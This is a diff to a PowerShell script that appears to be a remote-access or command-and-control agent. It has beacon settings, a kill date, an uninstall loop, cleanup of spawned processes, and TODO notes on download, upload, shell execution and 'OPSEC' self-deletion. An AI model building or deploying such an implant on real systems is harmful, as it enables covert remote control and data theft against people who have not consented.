@@ -1,10 +1,14 @@
 <#
-    Update Configs
-    Get file
-    Run command
-    Uninstall
+    TODO:
+    - Task Processing:
+        - Implement Download
+        - Implement Uploadd
+        - Implement Configure
+        ? Should ShellExecute support a `timeToLive` option?
+    - OPSEC:
+        - Implement `ShouldDeleteOnInstall` field and processing
+        - Implement better default configuration
 
-    command batching / recipes?
 #>
 
 <#
@@ -27,14 +31,14 @@ $SyncedConfig = [hashtable]::Synchronized(@{
                 Port      = ""
                 Route     = ""
             }
-            Interval            = 1
+            Interval            = 60
             SkewPercentage      = 0
             MaxFailures         = 3
             Failures            = 0
         }
 
         Sunset          = @{
-            Absolute = $([datetime]::Now.AddSeconds(10))
+            Absolute = $([datetime]::Now.AddDays(1))
             Relative = 0
         }
 
@@ -361,6 +365,15 @@ do {
     Start-Sleep -Seconds 1  
 } until ($SyncedConfig.ShouldUninstall -eq $true)
 
+# Extra pass just in case we missed something
+if ($syncedConfig.Tasks.InProgress.Count -gt 0) {
+    foreach ($task in $syncedConfig.Tasks.InProgress) {
+        [void](Get-WmiObject -Class Win32_Process).Where( {
+                $_.ParentProcessId -eq $task.Task.proc.id
+            }).Terminate()
+        $task.proc.Kill()
+    }
+}
 
 foreach ($runspace in (Get-Runspace).Where( { $_.Id -gt 1 } )) {
     [void]$runspace.Close()
@@ -368,3 +381,6 @@ foreach ($runspace in (Get-Runspace).Where( { $_.Id -gt 1 } )) {
 }
 
 # Probably should clean-up if on disk or something, idk
+if ($SyncedConfig.ShouldDeleteOnInstall) {
+    # Delete :)
+}
